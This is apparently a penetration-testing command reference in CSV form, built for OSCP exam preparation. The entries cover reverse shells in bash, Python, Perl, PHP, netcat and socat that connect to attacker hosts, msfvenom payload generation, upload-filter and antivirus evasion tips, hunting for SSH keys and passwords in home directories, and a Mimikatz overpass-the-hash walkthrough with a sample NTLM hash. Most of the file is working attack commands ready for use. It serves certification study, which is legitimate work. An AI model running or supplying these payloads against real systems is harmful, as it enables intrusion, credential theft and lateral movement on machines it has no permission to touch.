bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<LPORT>%200%3E%261%27","high","","","","{""no_dev_tcp"": ""Bash compiled without /dev/tcp support - use netcat or python alternative"", ""connection_refused"": ""Verify listener is running: 'ss -tlnp | grep <LPORT>'"", ""firewall_blocking"": ""Test connectivity: 'nc -zv <LHOST> <LPORT>' from target""}","{""-i"": ""Interactive mode (required for shell)"", "">&"": ""Redirect both stdout and stderr"", ""/dev/tcp/"": ""Bash pseudo-device for TCP connections"", ""0>&1"": ""Redirect stdin to stdout (bi-directional communication)""}","[""nc-listener-setup""]","[""python-reverse-shell"", ""netcat-reverse-shell-mkfifo""]","[""python-shell-upgrade"", ""stty-shell-stabilization""]"
"python-shell-upgrade","Python PTY Shell Upgrade","exploitation","python3 -c 'import pty;pty.spawn(""/bin/bash"")'","Upgrade dumb shell to interactive PTY shell with tab completion","shells","","First step in shell stabilization.

Always upgrade shells immediately after catching them.

Python3 preferred but python2 works identically.

After upgrade, run:
export TERM=xterm","high","","","","{""no_python3"": ""Try python2: 'python -c 'import pty;pty.spawn(\""/bin/bash\"")'"", ""no_python"": ""Try script: 'script /dev/null -c bash'"", ""still_dumb"": ""Run stty-shell-stabilization for full interactivity""}","{""-c"": ""Execute Python command string"", ""import pty"": ""Import pseudo-terminal module"", ""pty.spawn()"": ""Spawn new process in pseudo-terminal""}","[""bash-reverse-shell""]","","[""stty-shell-stabilization""]"
"stty-shell-stabilization","STTY Shell Stabilization","exploitation","python3 -c 'import pty;pty.spawn(""/bin/bash"")' && export TERM=xterm && stty raw -echo; fg","Fully stabilize reverse shell with proper terminal settings (tab completion, CTRL+C, arrow keys)","shells","","Full sequence:
1) python3 -c 'import pty;pty.spawn(""/bin/bash"")' 2) CTRL+Z 3) stty raw -echo; fg 4) export TERM=xterm 5) stty rows 38 cols 116 (match your terminal size with 'stty -a')","high","","","","{""shell_killed"": ""Forgot to background shell with CTRL+Z before running stty command"", ""echo_still_on"": ""Run 'stty -echo' again in the shell"", ""cant_background"": ""Some shells don't support backgrounding - use basic python upgrade only""}","{""stty raw"": ""Set terminal to raw mode (passes all input directly)"", ""-echo"": ""Disable local echo (prevents double typing)"", ""fg"": ""Bring backgrounded netcat listener back to foreground"", ""export TERM=xterm"": ""Set terminal type for proper rendering""}","[""python-shell-upgrade""]","",""
"msfvenom-windows-reverse-tcp","Msfvenom Windows Reverse TCP Payload","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT_FILE>","Generate Windows reverse shell executable payload","shells","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f exe -o shell.exe","For 32-bit:
use 'windows/shell_reverse_tcp'.

For staged payload:
use 'windows/x64/shell/reverse_tcp'.

Common formats:
exe, dll, aspx, jsp, war.

Always test on similar system first.","high","","","","{""av_detection"": ""Use encoding: add '-e x86/shikata_ga_nai -i 5' (but reduces reliability)"", ""wrong_arch"": ""Use windows/shell_reverse_tcp for 32-bit targets"", ""execution_failed"": ""Check architecture matches (x86 vs x64) and AV isn't blocking""}","{""-p"": ""Payload type (windows/x64/shell_reverse_tcp for 64-bit Windows)"", ""LHOST="": ""Set the attacker's listening IP address"", ""LPORT="": ""Set the attacker's listening port"", ""-f"": ""Output format (exe, dll, aspx, etc.)"", ""-o"": ""Output file name""}","","[""msfvenom-windows-meterpreter""]","[""nc-listener-setup"", ""python-http-server""]"
"msfvenom-linux-reverse-tcp","Msfvenom Linux Reverse TCP Payload","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT_FILE>","Generate Linux reverse shell ELF binary","shells","msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f elf -o shell.elf","For 32-bit:
use 'linux/x86/shell_reverse_tcp'.

After transfer:
chmod +x shell.elf && ./shell.elf.

Consider using bash/python one-liners instead if msfvenom binaries are detected.","high","","","","{""wrong_arch"": ""Use linux/x86/shell_reverse_tcp for 32-bit targets"", ""permission_denied"": ""chmod +x the payload after transfer"", ""execution_failed"": ""Check architecture matches and file has execute permissions""}","{""-p"": ""Payload type (linux/x64/shell_reverse_tcp for 64-bit Linux)"", ""LHOST="": ""Set the attacker's listening IP address"", ""LPORT="": ""Set the attacker's listening port"", ""-f"": ""Output format (elf for Linux executables)"", ""-o"": ""Output file name""}","","[""bash-reverse-shell"", ""python-reverse-shell""]","[""nc-listener-setup""]"
"msfvenom-php-webshell","Msfvenom PHP Web Shell","exploitation","msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o <OUTPUT_FILE>","Generate PHP reverse shell for web application exploitation","shells","msfvenom -p php/reverse_php LHOST=192.168.45.200 LPORT=443 -f raw -o shell.php","Alternative:
PentestMonkey PHP reverse shell (more reliable).

Check disabled_functions in phpinfo() - may need to use alternative payload.

Common upload bypasses:
.phtml, .php5, .php3, .inc","high","","","","{""upload_blocked"": ""Try renaming to .jpg.php, .phtml, .php5, or use null byte (.php%00.jpg)"", ""execution_failed"": ""Verify PHP is enabled and shell functions not disabled"", ""connection_refused"": ""Check firewall rules allow outbound connections on <LPORT>""}","{""-p"": ""Payload type (php/reverse_php for PHP reverse shell)"", ""LHOST="": ""Set the attacker's listening IP address"", ""LPORT="": ""Set the attacker's listening port"", ""-f"": ""Output format (raw for PHP source code)"", ""-o"": ""Output file name""}","","[""php-reverse-shell""]","[""nc-listener-setup""]"
"msfvenom-aspx-webshell","Msfvenom ASPX Web Shell","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <OUTPUT_FILE>","Generate ASP.NET reverse shell for IIS web application exploitation","shells","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f aspx -o shell.aspx","Works on IIS servers with ASP.NET enabled.

For ASP classic (older IIS):
use '-f asp' instead.

Test upload restrictions first.

Consider using cmd.aspx for simple command execution if reverse shell blocked.","high","","","","{""upload_blocked"": ""Try double extension: .jpg.aspx or content-type spoofing"", ""execution_failed"": ""Verify ASP.NET is enabled on IIS server"", ""connection_refused"": ""Check Windows Firewall allows outbound connections""}","{""-p"": ""Payload type (windows/x64/shell_reverse_tcp for Windows target)"", ""LHOST="": ""Set the attacker's listening IP address"", ""LPORT="": ""Set the attacker's listening port"", ""-f"": ""Output format (aspx for ASP.NET applications)"", ""-o"": ""Output file name""}","","","[""nc-listener-setup""]"
"netcat-reverse-shell-mkfifo","Netcat Reverse Shell (mkfifo)","exploitation","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f","Netcat reverse shell without -e flag using named pipes (FIFO)","shells","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.200 443 >/tmp/f","Works when netcat compiled without -e flag.

Named pipe creates bi-directional channel.

Alternative locations for pipe:
/dev/shm/f (tmpfs, no disk writes), /var/tmp/f (persistent across reboots).","high","","","","{""mkfifo_not_found"": ""Not available on this system - use bash or python alternative"", ""permission_denied"": ""Try writing to different directory: /dev/shm/f or /var/tmp/f"", ""connection_refused"": ""Verify listener is running: 'ss -tlnp | grep <LPORT>'""}","{""mkfifo"": ""Create named pipe (FIFO) for bi-directional communication"", ""/bin/sh -i"": ""Interactive shell"", ""2>&1"": ""Redirect stderr to stdout"", "">/tmp/f"": ""Write output to named pipe""}","[""nc-listener-setup""]","[""bash-reverse-shell"", ""python-reverse-shell""]","[""python-shell-upgrade"", ""stty-shell-stabilization""]"
"python-reverse-shell","Python Reverse Shell","exploitation","python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""<LHOST>"",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'","Python-based reverse shell using socket and subprocess modules","shells","python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""192.168.45.200"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'","Works on most Linux systems.

More reliable than bash /dev/tcp method.

URL-encode for web shells.

Python2 version identical, just use 'python' instead of 'python3'.

One-liner format ideal for RCE exploitation.","high","","","","{""no_python3"": ""Try python2: replace 'python3' with 'python'"", ""no_python"": ""Use bash or netcat alternative"", ""connection_refused"": ""Verify listener is running: 'ss -tlnp | grep <LPORT>'""}","{""socket.socket()"": ""Create TCP socket"", ""s.connect()"": ""Connect to attacker's listener"", ""os.dup2()"": ""Duplicate file descriptors (redirect stdin/stdout/stderr to socket)"", ""subprocess.call()"": ""Execute shell with redirected I/O""}","[""nc-listener-setup""]","[""bash-reverse-shell"", ""perl-reverse-shell"", ""netcat-reverse-shell-mkfifo""]","[""python-shell-upgrade"", ""stty-shell-stabilization""]"
"perl-reverse-shell","Perl Reverse Shell","exploitation","perl -e 'use Socket;$i=""<LHOST>"";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","Perl-based reverse shell using Socket module","shells","perl -e 'use Socket;$i=""192.168.45.200"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","Perl is commonly installed on older Linux/Unix systems.

Less common than bash/python but useful when those aren't available.

One-liner format ideal for command injection.","medium","","","","{""no_perl"": ""Use bash or python alternative"", ""no_socket_module"": ""Socket module missing - try python alternative"", ""connection_refused"": ""Verify listener is running: 'ss -tlnp | grep <LPORT>'""}","{""-e"": ""Execute Perl code"", ""use Socket"": ""Import socket module"", ""socket()"": ""Create TCP socket"", ""connect()"": ""Connect to attacker's listener"", ""open(STDIN,\"">&S\"")"": ""Redirect file descriptors to socket""}","[""nc-listener-setup""]","[""bash-reverse-shell"", ""python-reverse-shell"", ""netcat-reverse-shell-mkfifo""]","[""python-shell-upgrade"", ""stty-shell-stabilization""]"
"php-reverse-shell","PHP Reverse Shell","exploitation","php -r '$sock=fsockopen(""<LHOST>"",<LPORT>);exec(""/bin/sh -i <&3 >&3 2>&3"");'","PHP reverse shell one-liner using fsockopen","shells","php -r '$sock=fsockopen(""192.168.45.200"",443);exec(""/bin/sh -i <&3 >&3 2>&3"");'","Useful for PHP command injection or when you have PHP RCE.

Check disabled_functions with:
php -r 'print_r(ini_get(""disable_functions""));'.

Alternative functions:
system(), passthru(), shell_exec(), popen(), proc_open().","high","","","","{""fsockopen_disabled"": ""Check disabled_functions in phpinfo() - try proc_open or popen alternatives"", ""exec_disabled"": ""Try system(), passthru(), or shell_exec() instead of exec()"", ""connection_refused"": ""Verify listener is running and firewall allows outbound connections""}","{""-r"": ""Run PHP code without using PHP tags"", ""fsockopen()"": ""Open socket connection to attacker"", ""exec()"": ""Execute shell command"", ""<&3 >&3 2>&3"": ""Redirect stdin/stdout/stderr to socket (file descriptor 3)""}","[""nc-listener-setup""]","[""msfvenom-php-webshell"", ""msfvenom-php-reverse"", ""web-shell-php""]","[""python-shell-upgrade"", ""stty-shell-stabilization""]"
"pty-spawn-script","Spawn PTY Shell with Script","exploitation","script /dev/null -c bash","Spawn a proper PTY shell using script command to enable job control, tab completion, and clear screen functionality","shell-utilities","","CRITICAL OSCP TECHNIQUE: First step after gaining reverse shell.

WHY PTY shell matters:
(1) Job control - Ctrl+Z to background processes
(2) Tab completion - essential for enumeration
(3) Clear screen - Ctrl+L works
(4) Arrow keys - command history navigation
(5) Signal handling - Ctrl+C doesn't kill shell
(6) Interactive programs - su, sudo, ssh work properly

Full shell upgrade sequence:
1. Spawn PTY: script /dev/null -c bash
2. Background: Ctrl+Z
3. Raw mode: stty raw -echo; fg
4. Press Enter twice
5. Set terminal: export TERM=xterm
6. Set size: stty rows X cols Y

Alternatives if script not available:
- Python3: python3 -c 'import pty; pty.spawn(""/bin/bash"")'
- Python2: python -c 'import pty; pty.spawn(""/bin/bash"")'
- Perl: perl -e 'exec ""/bin/bash"";'
- socat (on target): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

Manual verification:
Before upgrade: Ctrl+C kills shell, tab completion broken, clear fails
After upgrade: Full interactive shell with all features

OSCP exam tip: ALWAYS upgrade shell immediately after foothold. Practice the full sequence until muscle memory.

Time estimate: 30 seconds","high","","","","{""script_not_found"": ""Use Python alternative: python3 -c 'import pty; pty.spawn(\""/bin/bash\"")'. Most Linux systems have Python"", ""still_no_job_control"": ""After spawning PTY, background shell (Ctrl+Z), run 'stty raw -echo; fg', then press Enter twice. Set TERM: export TERM=xterm"", ""shell_size_wrong"": ""Get local terminal size: 'stty size' on attacker machine. Set on target: 'stty rows X cols Y'""}","{""/dev/null"": ""Discard the typescript log file - we don't need session recording, just the PTY shell functionality"", ""-c bash"": ""Execute bash in the PTY context - provides full interactive shell with job control (Ctrl+Z, fg, bg)""}","","","[""linux-enumerate-users"", ""linux-enumerate-home-directory"", ""check-sudo-privs""]"
"revshells-payload-generate","Generate Reverse Shell Payload","exploitation","Visit https://www.revshells.com/ or use msfvenom","Generate reverse shell payloads for various languages and platforms using revshells.com online tool","shell-utilities","","OSCP RESOURCE: https://www.revshells.com/ - Essential bookmark for exam.

Popular payload types:
(1) Bash TCP: bash -i >& /dev/tcp/LHOST/LPORT 0>&1
(2) Python3: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""LHOST"",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'
(3) PHP: php -r '$sock=fsockopen(""LHOST"",LPORT);exec(""/bin/sh -i <&3 >&3 2>&3"");'
(4) Netcat: nc -e /bin/sh LHOST LPORT
(5) Socat: socat TCP:LHOST:LPORT EXEC:/bin/bash

URL encoding for web payloads:
Revshells.com provides URL-encoded versions automatically.

Manual generation with msfvenom:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f elf > shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe > shell.exe
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=9001 -f raw > shell.php

OSCP workflow:
1. Start listener: nc -lvnp 9001
2. Generate payload with revshells.com (set LHOST, LPORT)
3. Execute payload on target (RCE, upload, injection)
4. Receive shell on listener
5. Upgrade to PTY immediately

OSCP exam tip: Pre-generate common payloads before exam. Save bash, Python, PHP templates with LHOST/LPORT placeholders.

Time estimate: 1-2 minutes (generation + execution)","high","","","","{""no_connection"": ""Verify LHOST is reachable from target. Check firewall rules. Confirm listener running on LPORT"", ""payload_blocked"": ""Try different payload type. Base64 encode. Use HTTPS reverse shell. Test egress filtering"", ""connection_dies"": ""Upgrade to PTY shell immediately. Use stable payload (socat, meterpreter)""}","","[""nc-listener""]","","[""nc-listener"", ""pty-spawn-script""]"
"linux-enumerate-users","Enumerate Linux Users","exploitation","cat /etc/passwd | grep -E '/bin/(bash|sh)' | cut -d: -f1","Enumerate valid user accounts on Linux system by filtering /etc/passwd for users with login shells","shell-utilities","","CRITICAL OSCP ENUMERATION: Identify lateral movement and privilege escalation targets.

/etc/passwd format:
username:password:UID:GID:comment:home_directory:shell

Key observations:
(1) UID 0 = root (always present)
(2) UID 1000+ = regular users (target for lateral movement)
(3) UID < 1000 = system accounts (usually safe to ignore)
(4) Shell /bin/bash or /bin/sh = interactive login possible
(5) Shell /usr/sbin/nologin or /bin/false = service account, no login

Enumeration workflow:
1. List users with login shells (THIS COMMAND)
2. Check home directories: ls -la /home
3. Check sudo permissions: sudo -l
4. Read user-specific config: .bashrc, .bash_history, .ssh/

Manual verification:
For each user found:
- Home directory exists? ls -la /home/<username>
- SSH keys present? ls -la /home/<username>/.ssh/
- Bash history? cat /home/<username>/.bash_history
- Sudo access? sudo -l -U <username> (requires higher privs)

OSCP attack paths:
(1) Password reuse: Try found credentials on other users (su, SSH)
(2) Weak passwords: Generate wordlist from user info, crack with hydra/john
(3) SSH key theft: Copy id_rsa from .ssh/ directories
(4) Sudo exploitation: Check sudo permissions for each user

Alternative methods:
- getent passwd: Queries NSS databases (includes LDAP/NIS users)
- awk -F: '$3 >= 1000 {print $1}' /etc/passwd: Filter by UID threshold
- compgen -u: Bash built-in user listing (if available)

OSCP exam tip: Immediately enumerate users after shell upgrade. Document in enumeration.md. Check each user's home directory for credentials, SSH keys, scripts.

Time estimate: 30 seconds (command) + 5-10 minutes (home directory enumeration)","high","","","","{""no_results"": ""Try without grep filter: cat /etc/passwd. All users should be visible even to low-privilege account"", ""permission_denied"": ""Unusual - /etc/passwd should be world-readable. Try alternatives: getent passwd, ls -la /home"", ""finding_current_user"": ""Check current context: whoami, id, echo $USER""}","{""grep -E '/bin/(bash|sh)'"": ""Filter for users with valid login shells - excludes service accounts with /usr/sbin/nologin or /bin/false"", ""cut -d: -f1"": ""Extract first field (username) from colon-delimited /etc/passwd entries - format is username:x:uid:gid:comment:home:shell""}","","","[""linux-enumerate-home-directory"", ""check-sudo-privs"", ""su-user-switch""]"
"linux-enumerate-home-directory","Enumerate Linux Home Directories","exploitation","ls -la /home && for dir in /home/*; do echo ""\n=== $dir ===""; ls -la ""$dir"" 2>/dev/null; done","Enumerate all user home directories and their contents to discover credentials, SSH keys, scripts, and sensitive files","shell-utilities","","HIGH-VALUE OSCP ENUMERATION: Home directories contain credentials, SSH keys, config files.

High-priority targets in home directories:
(1) .ssh/id_rsa - Private SSH keys for lateral movement
(2) .ssh/authorized_keys - Shows which keys can access this user
(3) .bash_history - Command history revealing passwords, IPs, attack vectors
(4) .bashrc, .profile - Environment variables, aliases (may contain credentials)
(5) credentials.txt, passwords.txt - Plain text credential files
(6) .mysql_history - Database query history (may expose passwords)
(7) .viminfo - Vim editor history (may show edited credential files)
(8) user.txt - OSCP user flag (proof of user-level access)
(9) Scripts (*.sh, *.py) - May contain hardcoded credentials
(10) Config files (.conf, .config/) - Application credentials

Enumeration workflow:
1. List all home directories (THIS COMMAND)
2. For each accessible directory:
   a. Check for .ssh/id_rsa: ls -la /home/user/.ssh/
   b. Read bash history: cat /home/user/.bash_history
   c. Search for passwords: grep -i password /home/user/*
   d. Find world-readable files: find /home/user -type f -readable
3. Document findings in enumeration.md

Manual verification:
For each user found:
ls -la /home/<username>/.ssh/
cat /home/<username>/.bash_history | grep -i 'password\|ssh\|sudo'
find /home/<username> -type f -readable 2>/dev/null | head -20

Common OSCP scenarios:
(1) SSH key theft: Copy id_rsa, chmod 600, ssh -i id_rsa user@target
(2) Password reuse: Credentials in history/scripts work for sudo/su/SSH
(3) Writable directories: Upload tools to writable home directories
(4) Backup files: .backup, .bak, .old files contain old credentials

Advanced searches:
# Find all SSH keys
find /home -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null

# Search for password strings
grep -r -i 'password\|passwd\|pwd' /home 2>/dev/null | head -50

# Find recently modified files (recent activity)
find /home -type f -mtime -7 -readable 2>/dev/null

# Find SUID binaries in home (unusual)
find /home -type f -perm -4000 -readable 2>/dev/null

OSCP exam tip: Enumerate home directories immediately after user enumeration. Focus on .ssh, .bash_history, and grep for 'password'. Document all findings even if not immediately useful.

Time estimate: 2-5 minutes (initial enum) + 10-20 minutes (deep dive)","high","","","","{""all_permission_denied"": ""Normal for low-privilege user. Use find to search for world-readable files: find /home -type f -readable 2>/dev/null"", ""no_home_directories"": ""Check /root separately (requires root). Look for users in /etc/passwd with alternate home directories"", ""too_much_output"": ""Target specific users: ls -la /home/username. Search for specific files: find /home -name '*password*' -readable 2>/dev/null""}","{""ls -la /home"": ""List all home directories with permissions and ownership - identifies which users exist and directory permissions"", ""for dir in /home/*"": ""Iterate through each user's home directory to enumerate contents"", ""2>/dev/null"": ""Suppress permission denied errors for directories we can't read - keeps output clean""}","[""linux-enumerate-users"", ""pty-spawn-script""]","","[""extract-ssh-key"", ""check-sudo-privs"", ""linux-check-directory-permissions""]"
"linux-check-directory-permissions","Check Directory Permissions","exploitation","ls -la <DIRECTORY>","Check directory permissions, ownership, and contents to identify writable locations for privilege escalation or file upload","shell-utilities","ls -la /var/www/html","CRITICAL OSCP SKILL: Identifying writable locations for privilege escalation.

Permission string format:
drwxrwxrwx

     > Other permissions (everyone else)
   > Group permissions
 > Owner permissions
> Type (d=directory, -=file, l=symlink)

Permission bits:
r (read) = 4    - Can list directory contents (ls)
w (write) = 2   - Can create/delete files in directory
x (execute) = 1 - Can cd into directory and access files

OSCP privilege escalation indicators:
(1) Writable web directory (drwxrwxrwx /var/www/html)
     Upload webshell, achieve RCE

(2) Writable /etc (drwxrwxrwx /etc)
     Modify /etc/passwd, /etc/shadow, /etc/sudoers

(3) Writable cron directories (drwxrwxrwx /etc/cron.d)
     Add malicious cron job for root execution

(4) Writable script run by root (drwxrwxrwx /opt/scripts)
     Modify script executed by root cron/systemd

(5) Writable home directory of other user
     Plant SSH keys in .ssh/authorized_keys

(6) Writable /tmp, /var/tmp (always writable)
     Upload and execute tools (linpeas, exploits)

Enumeration workflow:
1. Check current directory: ls -la .
2. Check web root: ls -la /var/www/html
3. Check /etc: ls -la /etc
4. Check /opt: ls -la /opt
5. Check home directories: ls -la /home/*
6. Find all writable directories:
   find / -type d -writable 2>/dev/null | grep -v '/proc\|/sys\|/run'

Manual verification:
To test if directory is writable:
touch <DIRECTORY>/testfile && rm <DIRECTORY>/testfile && echo ""Writable"" || echo ""Not writable""

Common OSCP targets:
/var/www/html - Web root (upload webshell)
/etc/cron.d - Cron jobs (add malicious job)
/opt - Third-party apps (modify scripts)
/tmp, /var/tmp - Temporary (always writable, upload tools)
/home/<user> - User home (SSH key injection)
/usr/local/bin - Local binaries (PATH hijacking)

Advanced permission checks:
# Check ACLs (extended permissions)
getfacl <DIRECTORY>

# Check SELinux context
ls -Z <DIRECTORY>

# Find SUID binaries in directory
find <DIRECTORY> -type f -perm -4000 2>/dev/null

# Recursive permission check
namei -l <DIRECTORY>/path/to/file

OSCP exam tip: Document all writable directories in enumeration.md. Check /var/www/html immediately (webshell upload). Test writable directories with touch command before wasting time.

Time estimate: 30 seconds per directory check","high","","","","{""permission_denied"": ""Try parent directory: ls -la $(dirname <DIRECTORY>). Check current user context: id, groups"", ""understanding_permissions"": ""Format: drwxrwxrwx = [type][owner][group][other]. r=read(4), w=write(2), x=execute(1)"", ""finding_writable_directories"": ""Search system-wide: find / -type d -writable 2>/dev/null | grep -v '/proc\\|/sys'""}","{""-l"": ""Long format - shows permissions, ownership, size, modification time for each file/directory"", ""-a"": ""Show all files including hidden files (starting with dot) - critical for finding .ssh, .bash_history, .config""}","","","[""chmod-numeric-permissions"", ""mkdir-directory"", ""touch-file""]"
"overpass-mimikatz-pth","Overpass-the-Hash - Mimikatz sekurlsa::pth","active-directory","mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell","Convert NTLM hash to Kerberos TGT by creating process with hash then requesting Kerberos tickets","lateral-movement","mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell","OSCP TRAINING MATERIAL - OVERPASS-THE-HASH WITH MIMIKATZ:
TRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):
Scenario:
jen's credentials cached on CLIENT76 after running notepad as jen.

From CLIENT76 as jeff, performing overpass-the-hash:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

Result:
New PowerShell window opened in context of jen (with jen's credentials injected).

WHAT IS OVERPASS-THE-HASH:
Technique that converts NTLM hash into Kerberos Ticket Granting Ticket (TGT), enabling Kerberos authentication when you only have the NTLM hash.

Also called ""Pass-the-Key"".

WHY USE OVERPASS:
- Some tools REQUIRE Kerberos authentication (Sysinternals PsExec with Kerberos)
- Kerberos authentication is less logged/monitored than NTLM in some environments
- Avoids NTLM authentication over network (stealthier)
- Enables access to resources that only accept Kerberos

KEY DISTINCTION FROM PASS-THE-HASH:
- Pass-the-Hash (PTH):
Uses NTLM protocol directly with hash
- Overpass-the-Hash:
Converts NTLM hash  Kerberos TGT, then uses Kerberos protocol
- PTH:
Lateral movement via NTLM
- Overpass:
Lateral movement via Kerberos (requires TGT)

HOW OVERPASS-THE-HASH WORKS:
1.

Mimikatz sekurlsa::pth injects NTLM hash into LSASS process memory
2.

Creates new logon session with injected credentials
3.

Spawns specified program (/run:powershell) in new session context
4.

Program runs as original user (token) but has jen's credentials for network auth
5.

When Kerberos authentication triggered (net use, etc.), KDC uses injected hash for pre-authentication
6.

KDC issues TGT using hash (hash proves identity)
7.

TGT can then request service tickets (TGS) for lateral movement

TWO-STEP PROCESS (CRITICAL UNDERSTANDING):
Step 1:
sekurlsa::pth (injects credentials)
Step 2:
Trigger Kerberos authentication (net use, dir \\target, etc.) to generate TGT

sekurlsa::pth does NOT create TGT automatically - must trigger manually.

WHOAMI BEHAVIOR (FROM TRAINING):
After sekurlsa::pth, running whoami in new PowerShell shows ORIGINAL user (jeff), NOT impersonated user (jen).

Training explicitly states:
""Although jen is impersonated, the whoami command on this newly spawned PowerShell session shows the original user jeff.

This is the intended behavior.""

Why?
- whoami checks process token (shows jeff)
- Network authentication uses injected credentials (uses jen)
- Token impersonation vs credential injection are different mechanisms

Verify with klist (shows jen's Kerberos tickets), NOT whoami.

TRIGGERING KERBEROS AUTHENTICATION:
From training, after sekurlsa::pth, you must trigger Kerberos:
```powershell
PS C:\> net use \\files04
```

This command:
1.

Attempts to connect to files04 via SMB
2.

Triggers Kerberos authentication (because hostname used, not IP)
3.

KDC receives TGT request with jen's hash for pre-authentication
4.

KDC issues TGT for jen
5.

Client requests TGS for CIFS service on files04
6.

Connection succeeds using jen's Kerberos tickets

VERIFICATION:
From training, verify tickets created:
```powershell
PS C:\> klist
```

Output shows:
```
Client:
jen @ CORP.COM
Server:
krbtgt/CORP.COM @ CORP.COM
  KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
  Start Time:
<timestamp>
  End Time:
<timestamp>
  Renew Time:
<timestamp>
```

TGT confirmed (Server:
krbtgt).

Also shows TGS:
```
Server:
cifs/files04 @ CORP.COM
```

Service ticket for CIFS on files04.

LATERAL MOVEMENT:
From training, using Kerberos tickets for PsExec:
```powershell
PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
```

This succeeded because:
- PsExec detected Kerberos tickets in cache
- Used Kerberos authentication instead of NTLM
- jen's TGT valid for requesting service tickets
- Access granted to files04 as jen

PRE-AUTHENTICATION:
Kerberos pre-authentication uses password hash (NTLM or AES) to encrypt timestamp:
1.

Client requests TGT from KDC
2.

Client encrypts current timestamp with user's hash
3.

KDC decrypts with stored hash
4.

If decryption succeeds and timestamp valid, TGT issued

Overpass works because Mimikatz provides correct hash for encryption.

HASH SOURCES:
From training scenario, obtained hash via:
1.

jen ran notepad as herself on CLIENT76 (runas /user:jen notepad)
2.

Credentials cached in LSASS memory
3.

Mimikatz extracted:
sekurlsa::logonpasswords
4.

Output showed jen's NTLM hash:
369def79d8372408bf6e93364cc93075

Other sources:
- secretsdump.py (remote SAM/LSA dump)
- SAM database extraction
- LSA secrets
- NTDS.dit (domain controller database)

MANUAL ALTERNATIVE:
No direct manual alternative for overpass-the-hash:
- PowerShell cannot natively use hash for authentication
- Requires Mimikatz or Rubeus for hash-to-TGT conversion
- Normal flow requires plaintext password

Rubeus alternative:
```
Rubeus.exe asktgt /user:jen /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /ptt
```
Single command vs Mimikatz multi-step.

DOMAIN REQUIREMENT:
- /domain must be FQDN:
corp.com not CORP
- Matches Kerberos realm name
- Case-insensitive but convention is lowercase

PORT REQUIREMENTS:
- TCP 88:
Kerberos (KDC communication for TGT/TGS requests)
- TCP/UDP 88:
Kerberos authentication
- No SMB/RPC required for TGT request (unlike Pass-the-Hash)

EXECUTION CONTEXT:
New PowerShell spawned:
- Process owner:
Original user (jeff) - visible in Task Manager
- Process token:
jeff's token
- Network credentials:
jen's credentials (injected)
- Kerberos tickets:
jen's TGT/TGS

This split allows:
- Local operations:
As jeff
- Network operations:
As jen

SECURITY CONTEXT:
From training scenario:
- jeff:
Local user on CLIENT76 (attacker's initial access)
- jen:
Domain user, local admin on FILES04 (target privilege level)
- Overpass allows jeff's session to network authenticate as jen
- jeff never obtains jen's actual privileges locally

TIME ESTIMATE:
- sekurlsa::pth execution:
10-20 seconds
- Trigger Kerberos (net use):
5-10 seconds
- Verification (klist):
5 seconds
- Total:
1-2 minutes

EXAM STRATEGY:
1.

Obtain NTLM hash via Mimikatz/secretsdump
2.

Use overpass-the-hash to convert to Kerberos TGT
3.

Trigger with net use \\target (hostname NOT IP)
4.

Verify with klist (look for TGT with Server:
krbtgt)
5.

Use Kerberos-enabled tools (PsExec, PowerShell remoting)
6.

Remember whoami shows original user - use klist to verify

WHEN TO USE OVERPASS:
- Target requires Kerberos (not NTLM)
- Want to avoid NTLM authentication logs
- Have hash but need Kerberos tickets
- Sysinternals PsExec scenario (prefers Kerberos over NTLM)

